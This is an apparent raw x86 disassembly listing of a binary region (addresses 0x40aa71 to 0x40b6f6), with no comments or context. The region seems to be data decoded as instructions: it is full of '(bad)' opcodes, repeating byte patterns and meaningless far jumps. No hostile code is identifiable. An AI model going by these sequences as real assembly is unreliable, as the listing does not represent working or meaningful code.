  40aa71:	inc    DWORD PTR [eax]
  40aa73:	add    BYTE PTR [eax],al
  40aa75:	add    eax,DWORD PTR [eax]
  40aa77:	add    bh,bh
  40aa79:	inc    DWORD PTR [eax]
  40aa7b:	add    BYTE PTR [eax],al
  40aa7d:	add    eax,DWORD PTR [eax]
  40aa7f:	add    bh,bh
  40aa81:	inc    DWORD PTR [eax]
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	add    eax,DWORD PTR [eax]
  40aa87:	add    bh,bh
  40aa89:	inc    DWORD PTR [eax]
  40aa8b:	add    BYTE PTR [eax],al
  40aa8d:	add    eax,DWORD PTR [eax]
  40aa8f:	add    bh,bh
  40aa91:	inc    DWORD PTR [eax]
  40aa93:	add    BYTE PTR [eax],al
  40aa95:	add    eax,DWORD PTR [eax]
  40aa97:	add    bh,bh
  40aa99:	add    BYTE PTR [eax],al
  40aa9b:	add    BYTE PTR [eax],al
  40aa9d:	add    DWORD PTR [eax],eax
  40aa9f:	add    ah,bh
  40aaa1:	add    BYTE PTR [eax],al
  40aaa3:	add    BYTE PTR [eax],al
  40aaa5:	add    DWORD PTR [eax],eax
  40aaa7:	add    ah,bh
  40aaa9:	add    BYTE PTR [eax],al
  40aaab:	add    BYTE PTR [eax],al
  40aaad:	add    DWORD PTR [eax],eax
  40aaaf:	add    ah,bh
  40aab1:	add    BYTE PTR [eax],al
  40aab3:	add    BYTE PTR [eax],al
  40aab5:	add    DWORD PTR [eax],eax
  40aab7:	add    ah,bh
  40aab9:	add    BYTE PTR [eax],al
  40aabb:	add    BYTE PTR [eax],al
  40aabd:	add    BYTE PTR [eax],al
  40aabf:	add    ah,bh
  40aac1:	add    BYTE PTR [eax],al
  40aac3:	add    BYTE PTR [eax],al
  40aac5:	add    BYTE PTR [eax],al
  40aac7:	add    ah,bh
  40aac9:	add    BYTE PTR [eax],al
  40aacb:	add    BYTE PTR [eax],al
  40aacd:	add    BYTE PTR [eax],al
  40aacf:	add    ah,bh
  40aad1:	add    BYTE PTR [eax],al
  40aad3:	add    BYTE PTR [eax],al
  40aad5:	add    BYTE PTR [eax],al
  40aad7:	add    ah,bh
  40aad9:	add    BYTE PTR [eax],al
  40aadb:	add    BYTE PTR [eax],al
  40aadd:	add    BYTE PTR [eax],al
  40aadf:	add    ah,bh
  40aae1:	add    BYTE PTR [eax],al
  40aae3:	add    BYTE PTR [eax],al
  40aae5:	add    BYTE PTR [eax],al
  40aae7:	add    ah,bh
  40aae9:	add    BYTE PTR [eax],al
  40aaeb:	add    BYTE PTR [eax],al
  40aaed:	add    BYTE PTR [eax],al
  40aaef:	add    ah,bh
  40aaf1:	add    BYTE PTR [eax],al
  40aaf3:	add    BYTE PTR [eax],al
  40aaf5:	add    DWORD PTR [eax],eax
  40aaf7:	add    ah,bh
  40aaf9:	add    BYTE PTR [eax],al
  40aafb:	pop    ds
  40aafc:	(bad)  
  40aafd:	inc    DWORD PTR [eax]
  40aaff:	add    ah,bh
  40ab01:	add    BYTE PTR [eax],al
  40ab03:	pop    ds
  40ab04:	(bad)  
  40ab05:	inc    DWORD PTR [eax]
  40ab07:	add    ah,bh
  40ab09:	add    BYTE PTR [eax],al
  40ab0b:	pop    ds
  40ab0c:	(bad)  
  40ab0d:	inc    DWORD PTR [eax]
  40ab0f:	add    ah,bh
  40ab11:	add    BYTE PTR [eax],al
  40ab13:	pop    ds
  40ab14:	(bad)  
  40ab15:	inc    DWORD PTR [eax]
  40ab17:	add    ah,bh
  40ab19:	add    BYTE PTR [eax],al
  40ab1b:	pop    ds
  40ab1c:	(bad)  
  40ab1d:	inc    DWORD PTR [eax]
  40ab1f:	add    ah,bh
  40ab21:	add    BYTE PTR [eax],al
  40ab23:	pop    ds
  40ab24:	(bad)  
  40ab25:	inc    DWORD PTR [eax]
  40ab27:	add    ah,bh
  40ab29:	add    BYTE PTR [eax],al
  40ab2b:	pop    ds
  40ab2c:	(bad)  
  40ab2d:	inc    DWORD PTR [eax]
  40ab2f:	add    ah,bh
  40ab31:	add    BYTE PTR [eax],al
  40ab33:	pop    ds
  40ab34:	(bad)  
  40ab35:	inc    DWORD PTR [eax]
  40ab37:	add    ah,bh
  40ab39:	add    BYTE PTR [eax],al
  40ab3b:	pop    ds
  40ab3c:	(bad)  
  40ab3d:	inc    DWORD PTR [eax]
  40ab3f:	add    ah,bh
  40ab41:	add    BYTE PTR [eax],al
  40ab43:	pop    ds
  40ab44:	(bad)  
  40ab45:	inc    DWORD PTR [eax]
  40ab47:	add    ah,bh
  40ab49:	add    BYTE PTR [eax],al
  40ab4b:	pop    ds
  40ab4c:	(bad)  
  40ab4d:	inc    DWORD PTR [eax]
  40ab4f:	add    ah,bh
  40ab51:	add    BYTE PTR [eax],al
  40ab53:	pop    ds
  40ab54:	(bad)  
  40ab55:	inc    DWORD PTR [eax]
  40ab57:	add    ah,bh
  40ab59:	add    BYTE PTR [eax],al
  40ab5b:	pop    ds
  40ab5c:	(bad)  
  40ab5d:	inc    DWORD PTR [eax]
  40ab5f:	add    ah,bh
  40ab61:	add    BYTE PTR [eax],al
  40ab63:	pop    ds
  40ab64:	(bad)  
  40ab65:	inc    DWORD PTR [eax]
  40ab67:	add    ah,bh
  40ab69:	add    BYTE PTR [eax],al
  40ab6b:	pop    ds
  40ab6c:	(bad)  
  40ab6d:	inc    DWORD PTR [eax]
  40ab6f:	add    ah,bh
  40ab71:	add    BYTE PTR [eax],al
  40ab73:	pop    ds
  40ab74:	(bad)  
  40ab75:	inc    DWORD PTR [eax]
  40ab77:	add    dh,bh
  40ab79:	add    BYTE PTR [eax],al
  40ab7b:	aas    
  40ab7c:	(bad)  
  40ab7d:	inc    DWORD PTR [eax]
  40ab7f:	add    bh,bh
  40ab81:	(bad)  
  40ab82:	(bad)  
  40ab83:	(bad)  
  40ab84:	(bad)  
  40ab85:	inc    DWORD PTR [eax]
  40ab87:	add    bh,bh
  40ab89:	(bad)  
  40ab8a:	(bad)  
  40ab8b:	(bad)  
  40ab8c:	(bad)  
  40ab8d:	inc    DWORD PTR [eax]
  40ab8f:	add    bh,bh
  40ab91:	(bad)  
  40ab92:	(bad)  
  40ab93:	(bad)  
  40ab94:	(bad)  
  40ab95:	inc    DWORD PTR [eax]
  40ab97:	add    BYTE PTR [eax],ch
  40ab99:	add    BYTE PTR [eax],al
  40ab9b:	add    BYTE PTR [eax],ah
  40ab9d:	add    BYTE PTR [eax],al
  40ab9f:	add    BYTE PTR [eax+0x0],al
  40aba2:	add    BYTE PTR [eax],al
  40aba4:	add    DWORD PTR [eax],eax
  40aba6:	and    BYTE PTR [eax],al
  40aba8:	add    BYTE PTR [eax],al
  40abaa:	add    BYTE PTR [eax],al
  40abac:	adc    BYTE PTR [eax],0x0
	...
  40adfb:	add    BYTE PTR [edx-0x559fda85],ch
  40ae01:	jnp    0x40ae28
  40ae03:	leave  
  40ae04:	stos   BYTE PTR es:[edi],al
  40ae05:	jnp    0x40ae2c
  40ae07:	jmp    FWORD PTR [edx-0x5500da85]
  40ae0d:	jnp    0x40ae34
  40ae0f:	jmp    FWORD PTR [edx-0x5500da85]
  40ae15:	jnp    0x40ae3c
  40ae17:	jmp    FWORD PTR [edx-0x5500da85]
  40ae1d:	jnp    0x40ae44
  40ae1f:	jmp    FWORD PTR [edx-0x5500da85]
  40ae25:	jnp    0x40ae4c
  40ae27:	jmp    FWORD PTR [edx-0x5500da85]
  40ae2d:	jnp    0x40ae54
  40ae2f:	leave  
  40ae30:	stos   BYTE PTR es:[edi],al
  40ae31:	jnp    0x40ae58
  40ae33:	pusha  
	...
  40ae7c:	stos   BYTE PTR es:[edi],al
  40ae7d:	jnp    0x40aea4
  40ae7f:	leave  
  40ae80:	sar    BYTE PTR [esi+edx*4+0x7aa9c2ff],1
  40ae87:	(bad)  
  40ae88:	mov    edi,0xc2ff6fa1
  40ae8d:	mov    ds:0xa3c4ff6f,eax
  40ae92:	jo     0x40ae93
  40ae94:	leave  
  40ae95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae96:	outs   dx,DWORD PTR ds:[esi]
  40ae97:	dec    esp
  40ae99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae9a:	outs   dx,DWORD PTR ds:[esi]
  40ae9b:	call   eax
  40ae9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9e:	outs   dx,DWORD PTR ds:[esi]
  40ae9f:	call   edx
  40aea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea2:	outs   dx,DWORD PTR ds:[esi]
  40aea3:	call   esp
  40aea5:	mov    ds:0xa6d5ff6f,eax
  40aeaa:	jne    0x40aeab
  40aeac:	fstp   TBYTE PTR [ebx+0x7cabff91]
  40aeb2:	daa    
  40aeb3:	jmp    FWORD PTR [edx+0x3257b]
	...
  40aef9:	add    BYTE PTR [eax],al
  40aefb:	add    BYTE PTR [edx-0x3e42da85],ch
  40af01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af02:	jns    0x40af03
  40af04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af05:	jg     0x40af40
  40af07:	jmp    DWORD PTR [edx-0x5900d789]
  40af0d:	ja     0x40af3a
  40af0f:	jmp    FWORD PTR [edx-0x5200d586]
  40af15:	js     0x40af40
  40af17:	(bad)  
  40af18:	mov    edx,0xc1ff2b7d
  40af1d:	xor    DWORD PTR [ebx],0xffffffff
  40af20:	lds    eax,FWORD PTR [ebx+0x79c4ff35]
  40af26:	xor    bh,bh
  40af28:	shl    DWORD PTR [eax+0x2d],0xff
  40af2c:	rcr    BYTE PTR [ecx-0x754a009b],cl
  40af32:	cmp    eax,0x257baaff
  40af37:	sub    al,BYTE PTR [eax]
	...
  40af79:	add    BYTE PTR [eax],al
  40af7b:	add    BYTE PTR [edx-0x3c72da85],ch
  40af81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af82:	jo     0x40af83
  40af84:	mov    ah,0x90
  40af86:	inc    edi
  40af87:	(bad)  
  40af88:	mov    ecx,0xe1ff4495
  40af8d:	shl    BYTE PTR [edi+0x52a3c8ff],1
  40af93:	(bad)  
  40af94:	mov    edi,0xccff348f
  40af99:	sahf   
  40af9a:	dec    edi
  40af9b:	(bad)  
  40af9c:	out    dx,al
  40af9d:	faddp  st(0),st
  40af9f:	push   edx
  40afa1:	loop   0x40af6c
  40afa3:	(bad)  
  40afa4:	out    dx,al
  40afa5:	xlat   BYTE PTR ds:[ebx]
  40afa6:	mov    eax,0xb8d7eeff
  40afab:	dec    ebx
  40afad:	mov    dl,BYTE PTR [edx-0x1]
  40afb0:	ret    
  40afb1:	fwait
  40afb2:	push   edi
  40afb3:	jmp    FWORD PTR [edx+0x5a257b]
	...
  40afd5:	add    BYTE PTR [eax],al
  40afd7:	add    BYTE PTR [ebx+0x7a],cl
  40afda:	pushf  
  40afdb:	or     al,BYTE PTR [esi+0x74]
  40afde:	xchg   ebp,eax
  40afdf:	xor    eax,0x668b693d
  40afe4:	cmp    al,0x68
  40afe6:	mov    bl,BYTE PTR [edx-0x3a7597c5]
  40afec:	cmp    ebp,DWORD PTR [eax-0x76]
  40afef:	jecxz  0x40b02c
  40aff1:	push   0x683cf68a
  40aff6:	mov    edi,edi
  40aff8:	cmp    ebp,DWORD PTR [eax-0x77]
  40affb:	mul    BYTE PTR [edi+0x6f]
  40affe:	(bad)  
  40afff:	out    dx,al
  40b000:	mov    esi,0xbcff5a9a
  40b005:	cdq    
  40b006:	push   edx
  40b007:	(bad)  
  40b008:	mov    esi,0xf1ff3b96
  40b00d:	call   0xf93dafe2
  40b012:	repnz (bad) 
  40b014:	faddp  st(3),st
  40b016:	cmp    edi,0xff57add7
  40b01c:	in     eax,dx
  40b01d:	fdiv   DWORD PTR [eax-0x49251101]
  40b023:	(bad)  
  40b024:	in     eax,dx
  40b025:	shr    BYTE PTR [esi-0x512d1201],cl
  40b02b:	inc    esi
  40b02d:	add    DWORD PTR [esi-0x1],0xff6ea8cd
  40b034:	stos   BYTE PTR es:[edi],al
  40b035:	jnp    0x40b05c
  40b037:	mov    al,BYTE PTR [eax]
	...
  40b051:	add    BYTE PTR [eax],al
  40b053:	add    BYTE PTR [ebx+0x7c],cl
  40b056:	pushf  
  40b057:	push   esi
  40b058:	inc    edi
  40b059:	and    DWORD PTR [esp+eiz*8-0x567cc6],0xffb59246
  40b064:	lods   al,BYTE PTR fs:[esi]
  40b066:	(bad)  
  40b067:	push   DWORD PTR [edi-0x3f]
  40b06a:	sar    bh,cl
  40b06c:	jnp    0x40b03a
  40b06e:	(bad)  
  40b070:	jae    0x40b041
  40b072:	out    0xff,al
  40b074:	pop    edi
  40b075:	leave  
  40b076:	call   0xe0f8f77a
  40b07b:	inc    DWORD PTR [edi-0x62]
  40b07e:	mov    bh,0xff
  40b080:	mov    ah,0x8a
  40b082:	ds inc ecx
  40b085:	sahf   
  40b086:	pop    eax
  40b087:	(bad)  
  40b088:	mov    eax,0xc8ff2a88
  40b08d:	sahf   
  40b08e:	cmp    bh,bh
  40b090:	call   0xff40546a
  40b095:	std    
  40b096:	cli    
  40b097:	(bad)  
  40b098:	in     eax,dx
  40b099:	fdiv   QWORD PTR [eax+0x45a5d8ff]
  40b09f:	call   edx
  40b0a1:	xchg   esp,eax
  40b0a2:	xor    eax,0x2e83ccff
  40b0a7:	inc    esi
  40b0a9:	js     0x40b0d4
  40b0ab:	inc    esp
  40b0ad:	jbe    0x40b0e5
  40b0af:	call   edx
  40b0b1:	test   al,0x72
  40b0b3:	jmp    FWORD PTR [edx+0xba257b]
	...
  40b0d1:	add    BYTE PTR [eax],al
  40b0d3:	add    BYTE PTR [esi+0x7c],cl
  40b0d6:	pushf  
  40b0d7:	sti    
  40b0d8:	ds xchg edx,eax
  40b0da:	mov    edx,0xeab932ff
  40b0df:	call   DWORD PTR [esi-0x33]
  40b0e2:	repnz inc DWORD PTR [ecx-0x6a00091f]
  40b0e9:	call   0xe1c9b0e3
  40b0ee:	repnz (bad) 
  40b0f0:	jns    0x40b0ca
  40b0f2:	out    dx,eax
  40b0f3:	jmp    DWORD PTR [ecx-0x36]
  40b0f6:	jmp    0x2eff:0xe4ba45ff
  40b0fd:	lods   al,BYTE PTR ds:[esi]
  40b0fe:	fdivp  st(7),st
  40b100:	stos   DWORD PTR es:[edi],eax
  40b101:	jl     0x40b12a
  40b103:	dec    edx
  40b105:	lods   al,BYTE PTR ds:[esi]
  40b106:	imul   edi,edi,0xffffffbb
  40b109:	mov    DWORD PTR [ebx],ebp
  40b10b:	inc    edx
  40b10d:	mov    gs,WORD PTR [eax]
  40b10f:	dec    esi
  40b111:	pushf  
  40b112:	xor    al,0xff
  40b114:	loope  0x40b0d5
  40b116:	ins    DWORD PTR es:[edi],dx
  40b117:	(bad)  
  40b118:	cli    
  40b119:	hlt    
  40b11a:	in     eax,0xff
  40b11c:	stc    
  40b11d:	icebp  
  40b11e:	(bad)  
  40b120:	fnsave [eax-0x753100a3]
  40b126:	sub    al,0xff
  40b128:	enter  0x2478,0xff
  40b12c:	les    esi,FWORD PTR [edx+0x2c]
  40b12f:	call   ebp
  40b131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b132:	outs   dx,DWORD PTR ds:[esi]
  40b133:	jmp    FWORD PTR [edx+0xea257b]
	...
  40b151:	add    BYTE PTR [eax],al
  40b153:	add    BYTE PTR [ebp+0x7e],cl
  40b156:	mov    al,ds:0xc2983fff
  40b15b:	jmp    FWORD PTR ds:0x55fff3c0
  40b161:	iret   
  40b162:	repz inc DWORD PTR [ecx-0x6a000a1f]
  40b169:	call   0xe1c9b163
  40b16e:	repnz (bad) 
  40b170:	js     0x40b14b
  40b172:	out    dx,eax
  40b173:	jmp    DWORD PTR [eax-0x36]
  40b176:	jmp    0x2eff:0xe5ba45ff
  40b17d:	scas   al,BYTE PTR es:[edi]
  40b17e:	(bad)  
  40b180:	mov    WORD PTR [edx-0x4b2f00b7],es
  40b186:	jp     0x40b187
  40b188:	lds    ebx,FWORD PTR [edi+eax*2+0x3797c6ff]
  40b18f:	dec    ebp
  40b191:	cdq    
  40b192:	xor    al,0xff
  40b194:	shl    DWORD PTR [edx+edi*1+0x5abce0ff],cl
  40b19b:	(bad)  
  40b19c:	sti    
  40b19d:	cmc    
  40b19e:	call   0xf43baea2
  40b1a3:	call   esi
  40b1a5:	cwde   
  40b1a6:	xor    eax,0x2482ccff
  40b1ab:	inc    edi
  40b1ad:	jns    0x40b1d6
  40b1af:	call   ebx
  40b1b1:	call   0xff33:0x84b1ff63
  40b1b8:	stos   BYTE PTR es:[edi],al
  40b1b9:	jnp    0x40b1e0
  40b1bb:	sbb    BYTE PTR [eax],al
	...
  40b1d1:	add    BYTE PTR [eax],al
  40b1d3:	add    BYTE PTR [edi-0x7f],cl
  40b1d6:	mov    eax,ds:0xc39a40ff
  40b1db:	jmp    FWORD PTR ds:0x55fff3c0
  40b1e1:	into   
  40b1e2:	repz inc DWORD PTR [ecx-0x6a000a1f]
  40b1e9:	call   0xe1c9b1e3
  40b1ee:	repnz (bad) 
  40b1f0:	js     0x40b1cb
  40b1f2:	out    dx,eax
  40b1f3:	jmp    DWORD PTR [eax-0x36]
  40b1f6:	jmp    0x2eff:0xe4ba45ff
  40b1fd:	lods   eax,DWORD PTR ds:[esi]
  40b1fe:	loopne 0x40b1ff
  40b200:	outs   dx,DWORD PTR ds:[esi]
  40b201:	mov    DWORD PTR [ebx-0x1],ebp
  40b204:	shl    BYTE PTR [ebx-0x54310087],1
  40b20a:	pusha  
  40b20b:	dec    ebp
  40b20d:	mov    ds:0xabd4ff4c,eax
  40b212:	push   edx
  40b213:	(bad)  
  40b214:	fnstsw WORD PTR [eax-0x1c0d009e]
  40b21a:	mov    ebp,0xffffffff
  40b21f:	push   eax
  40b221:	(bad)  [edx+0x3ea3dbff]
  40b227:	call   ebp
  40b229:	xchg   esp,eax
  40b22a:	xor    edi,edi
  40b22c:	iret   
  40b22d:	mov    ch,BYTE PTR [edi]
  40b22f:	call   ebp
  40b231:	sahf   
  40b232:	pop    edx
  40b233:	(bad)  
  40b234:	mov    edi,0xaaff4e96
  40b239:	jnp    0x40b260
  40b23b:	dec    ebx
	...
  40b254:	push   ecx
  40b255:	and    DWORD PTR [ecx-0x3c65be01],0xf3c02dff
  40b25f:	call   DWORD PTR [ebp-0x32]
  40b262:	repz inc DWORD PTR [ecx-0x6a000a1f]
  40b269:	call   0xe1c9b263
  40b26e:	repnz (bad) 
  40b270:	jns    0x40b24a
  40b272:	lock jmp DWORD PTR [ecx-0x36]
  40b276:	jmp    0x40b277
  40b278:	inc    esi
  40b279:	mov    edx,0xad2effe5
  40b27e:	loopne 0x40b27f
  40b280:	push   esp
  40b281:	(bad)  
  40b282:	mov    edi,?
  40b284:	retf   0x6baa
  40b287:	(bad)  
  40b288:	fidivr DWORD PTR [ebp-0x4d290083]
  40b28e:	gs (bad) 
  40b290:	fdivr  QWORD PTR [ebx+esi*2-0x461f1001]
  40b297:	(bad)  
  40b298:	(bad)  
  40b299:	(bad)  
  40b29a:	(bad)  
  40b29b:	push   ebp
  40b29d:	jmp    0xc226b26b
  40b2a2:	imul   edi,edi,0xffffffe1
  40b2a5:	mov    bh,0x62
  40b2a7:	jmp    ecx
  40b2a9:	mov    bl,0x5f
  40b2ab:	(bad)  
  40b2ac:	fisubr WORD PTR [edi-0x491e00a1]
  40b2b2:	jns    0x40b2b3
  40b2b4:	int    0xad
  40b2b6:	jno    0x40b2b7
  40b2b8:	lods   al,BYTE PTR ds:[esi]
  40b2b9:	jge    0x40b2e1
  40b2bb:	jp     0x40b2bd
	...
  40b2d1:	add    BYTE PTR [eax],al
  40b2d3:	add    BYTE PTR [edx-0x7b],dl
  40b2d6:	mov    ds:0xc59d42ff,al
  40b2db:	jmp    FWORD PTR ds:0x55fff3bf
  40b2e1:	iret   
  40b2e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b2e9:	call   0xe1c9b2e3
  40b2ee:	repz (bad) 
  40b2f0:	js     0x40b2ca
  40b2f2:	out    dx,eax
  40b2f3:	jmp    DWORD PTR [eax-0x36]
  40b2f6:	jmp    0x2dff:0xe4ba45ff
  40b2fd:	scas   al,BYTE PTR es:[edi]
  40b2fe:	(bad)  
  40b300:	xor    eax,0xbdffaf97
  40b305:	xchg   esi,eax
  40b306:	dec    ebp
  40b307:	jmp    edx
  40b309:	retf   
  40b30a:	cwde   
  40b30b:	(bad)  
  40b30c:	fnstsw WORD PTR [edi-0x26140082]
  40b312:	mov    al,0xff
  40b314:	(bad)  
  40b315:	(bad)  
  40b316:	(bad)  
  40b317:	(bad)  
  40b318:	clc    
  40b319:	out    dx,eax
  40b31a:	fcos   
  40b31c:	out    0xc7,eax
  40b31e:	cmp    bh,0xe5
  40b321:	ret    0xff75
  40b324:	in     eax,0xc1
  40b326:	jae    0x40b327
  40b328:	in     eax,0xbf
  40b32a:	jae    0x40b32b
  40b32c:	in     eax,0xbd
  40b32e:	jae    0x40b32f
  40b330:	out    0xc0,al
  40b332:	cmp    bh,0xdb
  40b335:	mov    edi,0x7eaeff8d
  40b33a:	daa    
  40b33b:	scas   al,BYTE PTR es:[edi]
	...
  40b354:	push   ebp
  40b355:	xchg   BYTE PTR [edx-0x3a62bc01],ah
  40b35b:	jmp    FWORD PTR ds:0x55fff3bf
  40b361:	iret   
  40b362:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b369:	call   0xe1c9b363
  40b36e:	repz (bad) 
  40b370:	js     0x40b34a
  40b372:	out    dx,eax
  40b373:	jmp    DWORD PTR [eax-0x36]
  40b376:	jmp    0x2dff:0xe4ba45ff
  40b37d:	scas   al,BYTE PTR es:[edi]
  40b37e:	(bad)  
  40b380:	sbb    bl,BYTE PTR [ebp-0x7d500031]
  40b386:	das    
  40b387:	(bad)  
  40b388:	jmp    0x40b363
  40b38a:	mov    cl,0xff
  40b38c:	in     al,0xc9
  40b38e:	mov    ?,edi
  40b390:	in     eax,dx
  40b391:	(bad)  [ecx-0x31150a01]
  40b397:	(bad)  
  40b398:	jmp    0xe840456b
  40b39d:	leave  
  40b39e:	xchg   edi,edi
  40b3a0:	call   0xe940386e
  40b3a5:	leave  
  40b3a6:	xchg   bh,bh
  40b3a8:	jmp    0xe9403974
  40b3ad:	leave  
  40b3ae:	test   bh,bh
  40b3b0:	jmp    0xe8403f7f
  40b3b5:	shl    BYTE PTR [ebp+0x2680aeff],1
  40b3bb:	fiadd  DWORD PTR [eax]
	...
  40b3d1:	add    BYTE PTR [eax],al
  40b3d3:	add    BYTE PTR [ebp-0x7a],dl
  40b3d6:	mov    ds:0xc59d43ff,al
  40b3db:	jmp    FWORD PTR ds:0x55fff3bf
  40b3e1:	into   
  40b3e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b3e9:	jmp    0xe2c9b3e3
  40b3ee:	repnz (bad) 
  40b3f0:	js     0x40b3cb
  40b3f2:	out    dx,eax
  40b3f3:	jmp    DWORD PTR [eax-0x36]
  40b3f6:	jmp    0x2eff:0xe5ba45ff
  40b3fd:	scas   al,BYTE PTR es:[edi]
  40b3fe:	loopne 0x40b3ff
  40b400:	adc    bl,BYTE PTR [edi-0x7b9b0026]
  40b406:	ins    DWORD PTR es:[edi],dx
  40b407:	call   edi
  40b409:	mov    ebp,0xdceeff8e
  40b40e:	mov    edx,0xb4daedff
  40b413:	(bad)  
  40b414:	out    dx,al
  40b415:	(bad)  [ebp-0x4b261201]
  40b41b:	(bad)  
  40b41c:	out    dx,eax
  40b41d:	fidiv  DWORD PTR [ebx-0x4d241001]
  40b423:	(bad)  
  40b424:	out    dx,eax
  40b425:	(bad)  [edx-0x4d241001]
  40b42b:	(bad)  
  40b42c:	out    dx,eax
  40b42d:	(bad)  [edx-0x4b241001]
  40b433:	(bad)  
  40b434:	call   0xab40660d
  40b439:	jnp    0x40b460
  40b43b:	iret   
	...
  40b454:	push   ebp
  40b455:	xchg   BYTE PTR [edx-0x3a62bc01],ah
  40b45b:	jmp    FWORD PTR ds:0x55fff3bf
  40b461:	into   
  40b462:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b469:	jmp    0xe2c9b463
  40b46e:	repnz (bad) 
  40b470:	js     0x40b44b
  40b472:	out    dx,eax
  40b473:	jmp    DWORD PTR [eax-0x36]
  40b476:	jmp    0x2eff:0xe5ba45ff
  40b47d:	scas   al,BYTE PTR es:[edi]
  40b47e:	loopne 0x40b47f
  40b480:	adc    bl,BYTE PTR [edi-0x71e00026]
  40b486:	mov    dh,0xff
  40b488:	sub    BYTE PTR fs:[ebp-0x1],0xaa
  40b48d:	jnp    0x40b4b4
  40b48f:	jmp    FWORD PTR [edx-0x5500da85]
  40b495:	jnp    0x40b4bc
  40b497:	jmp    FWORD PTR [edx-0x5500da85]
  40b49d:	jnp    0x40b4c4
  40b49f:	jmp    FWORD PTR [edx-0x5500da85]
  40b4a5:	jnp    0x40b4cc
  40b4a7:	jmp    FWORD PTR [edx-0x5500da85]
  40b4ad:	jnp    0x40b4d4
  40b4af:	jmp    FWORD PTR [edx-0x5500da85]
  40b4b5:	jnp    0x40b4dc
  40b4b7:	iret   
  40b4b8:	stos   BYTE PTR es:[edi],al
  40b4b9:	jnp    0x40b4e0
  40b4bb:	data16 add BYTE PTR [eax],al
	...
  40b4d2:	add    BYTE PTR [eax],al
  40b4d4:	push   ebp
  40b4d5:	xchg   BYTE PTR [edx-0x3a62bc01],ah
  40b4db:	jmp    FWORD PTR ds:0x55fff3bf
  40b4e1:	into   
  40b4e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b4e9:	jmp    0xe2c9b4e3
  40b4ee:	repnz (bad) 
  40b4f0:	js     0x40b4cb
  40b4f2:	out    dx,eax
  40b4f3:	jmp    DWORD PTR [eax-0x36]
  40b4f6:	jmp    0x2eff:0xe5ba45ff
  40b4fd:	scas   al,BYTE PTR es:[edi]
  40b4fe:	loopne 0x40b4ff
  40b500:	adc    bl,BYTE PTR [edi-0x6dfe0026]
  40b506:	aad    0xff
  40b508:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b50e:	fdivr  st,st(7)
  40b510:	and    al,0x89
  40b512:	sar    bh,0x41
  40b515:	js     0x40b4b1
  40b517:	inc    DWORD PTR [eax]
	...
  40b551:	add    BYTE PTR [eax],al
  40b553:	add    BYTE PTR [ebp-0x7a],dl
  40b556:	mov    ds:0xc59d43ff,al
  40b55b:	jmp    FWORD PTR ds:0x55fff3bf
  40b561:	iret   
  40b562:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b569:	call   0xe1c9b563
  40b56e:	repz (bad) 
  40b570:	js     0x40b54a
  40b572:	out    dx,eax
  40b573:	jmp    DWORD PTR [eax-0x36]
  40b576:	jmp    0x2dff:0xe4ba45ff
  40b57d:	scas   al,BYTE PTR es:[edi]
  40b57e:	(bad)  
  40b580:	adc    DWORD PTR [edi-0x6cfe0026],ebx
  40b586:	aad    0xff
  40b588:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b58e:	fdivr  st,st(7)
  40b590:	and    al,0x89
  40b592:	sar    bh,0x41
  40b595:	js     0x40b531
  40b597:	inc    DWORD PTR [eax]
	...
  40b5d1:	add    BYTE PTR [eax],al
  40b5d3:	add    BYTE PTR [ebp-0x7a],dl
  40b5d6:	mov    ds:0xc59d43ff,al
  40b5db:	jmp    FWORD PTR ds:0x55fff3bf
  40b5e1:	into   
  40b5e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b5e9:	jmp    0xe2c9b5e3
  40b5ee:	repnz (bad) 
  40b5f0:	js     0x40b5cb
  40b5f2:	out    dx,eax
  40b5f3:	jmp    DWORD PTR [eax-0x36]
  40b5f6:	jmp    0x2eff:0xe5ba45ff
  40b5fd:	scas   al,BYTE PTR es:[edi]
  40b5fe:	loopne 0x40b5ff
  40b600:	adc    bl,BYTE PTR [edi-0x6dfe0026]
  40b606:	aad    0xff
  40b608:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b60e:	fdivr  st,st(7)
  40b610:	and    al,0x89
  40b612:	sar    bh,0x41
  40b615:	js     0x40b5b1
  40b617:	inc    DWORD PTR [eax]
	...
  40b651:	add    BYTE PTR [eax],al
  40b653:	add    BYTE PTR [ebp-0x7a],dl
  40b656:	mov    ds:0xc59d43ff,al
  40b65b:	jmp    FWORD PTR ds:0x55fff3bf
  40b661:	into   
  40b662:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b669:	jmp    0xe2c9b663
  40b66e:	repnz (bad) 
  40b670:	js     0x40b64b
  40b672:	out    dx,eax
  40b673:	jmp    DWORD PTR [eax-0x36]
  40b676:	jmp    0x2eff:0xe5ba45ff
  40b67d:	scas   al,BYTE PTR es:[edi]
  40b67e:	loopne 0x40b67f
  40b680:	adc    bl,BYTE PTR [edi-0x6dfe0026]
  40b686:	aad    0xff
  40b688:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b68e:	fdivr  st,st(7)
  40b690:	and    al,0x89
  40b692:	sar    bh,0x41
  40b695:	js     0x40b631
  40b697:	inc    DWORD PTR [eax]
	...
  40b6d1:	add    BYTE PTR [eax],al
  40b6d3:	add    BYTE PTR [ebp-0x7a],dl
  40b6d6:	mov    ds:0xc59d43ff,al
  40b6db:	jmp    FWORD PTR ds:0x55fff3bf
  40b6e1:	iret   
  40b6e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b6e9:	call   0xe1c9b6e3
  40b6ee:	repz (bad) 
  40b6f0:	js     0x40b6ca
  40b6f2:	out    dx,eax
  40b6f3:	jmp    DWORD PTR [eax-0x36]
  40b6f6:	jmp    0x2dff:0xe4ba45ff
